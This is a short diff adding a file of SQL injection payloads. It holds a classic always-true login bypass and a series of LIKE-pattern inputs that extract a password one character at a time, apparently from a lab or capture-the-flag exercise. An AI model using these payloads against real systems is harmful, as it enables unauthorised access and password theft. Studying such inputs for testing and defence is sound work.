@@ -1,0 +1,7 @@
+whatever ' or '1'='1
+
+' or password like 'k%
+
+' or password like 'ki%
+
+' or password like 'kit%
